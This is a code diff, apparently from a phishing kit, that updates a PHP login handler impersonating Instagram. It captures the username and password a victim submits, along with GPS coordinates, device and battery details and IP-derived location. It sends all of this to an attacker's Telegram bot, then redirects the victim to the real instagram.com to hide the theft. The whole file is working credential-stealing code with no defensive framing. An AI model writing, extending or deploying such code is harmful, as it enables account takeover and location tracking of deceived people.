@@ -1,28 +1,60 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $username = $_POST["username"];
-    $password = $_POST["password"];
+    $username = $_POST["username"] ?? 'Unknown';
+    $password = $_POST["password"] ?? 'Unknown';
 
-    // Get the user's IP address
+    // Get User IP
     $ip_address = $_SERVER['REMOTE_ADDR'];
 
-    // Check if the forwarded header is available and not empty
-    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        // Split the header value to handle proxies
-        $forwarded_ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
-        // Trim and take the last IP in the list, which is the client's IP
-        $ip_address = trim(end($forwarded_ips));
-    }
+    // Get Additional Headers
+    $userAgent = $_POST["userAgent"] ?? 'Unknown';
+    $platform = $_POST["platform"] ?? 'Unknown';
+    $screenWidth = $_POST["screenWidth"] ?? 'Unknown';
+    $screenHeight = $_POST["screenHeight"] ?? 'Unknown';
+    $language = $_POST["language"] ?? 'Unknown';
+    $batteryLevel = $_POST["batteryLevel"] ?? 'Unknown';
+    $isCharging = $_POST["isCharging"] ?? 'Unknown';
+    $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct Access';
+    $acceptLang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown';
 
-    // Send data to Telegram bot
-    $telegramBotToken = "your-telegram-bot-token";
-    $chatId = "your-chat-id";
-    $message = "Hello admin, somebody just logged in:\n\nUsername: " . $username . " (Instagram)\n\nPassword: " . $password . "\n\nIP Address: " . $ip_address;
+    // Get Location Data
+    $latitude = $_POST["latitude"] ?? 'Not Available';
+    $longitude = $_POST["longitude"] ?? 'Not Available';
+    $map_link = "https://www.google.com/maps?q=$latitude,$longitude";
 
-    $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
-    file_get_contents($telegramApiUrl); // Send message to Telegram bot
+    // Get ISP & Country Details using IP API
+    $ipDetails = json_decode(file_get_contents("http://ip-api.com/json/$ip_address"), true);
+    $isp = $ipDetails['isp'] ?? 'Unknown ISP';
+    $country = $ipDetails['country'] ?? 'Unknown Country';
+    $city = $ipDetails['city'] ?? 'Unknown City';
 
-    // Redirect back to login_form.html with a message
-    echo "Password is incorrect.";
+    // Telegram Bot Details
+    $telegramBotToken = "xxxxxxxxxx"; 
+    $chatId = "xxxxxxxxxx"; 
+
+    // Prepare Message
+    $message = "User Login Attempt\n\n"
+             . "Username: " . $username . "\n"
+             . "Password: " . $password . "\n"
+             . "IP Address: " . $ip_address . "\n"
+             . "GPS Location: [Open in Maps]($map_link)\n"
+             . "Latitude: " . $latitude . "\n"
+             . "Longitude: " . $longitude . "\n\n"
+             . "Location Details:\n"
+             . "Country: " . $country . "\n"
+             . "City: " . $city . "\n"
+             . "ISP: " . $isp . "\n\n"
+             . "Device Info: \n"
+             . "Platform: " . $platform . "\n"
+             . "Screen Size: " . $screenWidth . "x" . $screenHeight . "\n"
+             . "Battery: " . $batteryLevel . " | Charging: " . $isCharging . "\n";
+
+    // Send Message to Telegram
+    $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId&text=" . urlencode($message) . "&parse_mode=Markdown";
+    file_get_contents($telegramApiUrl);
+
+    // Send JSON response for AJAX redirect
+    echo json_encode(["redirect" => "https://instagram.com"]);
+    exit();
 }
 ?>
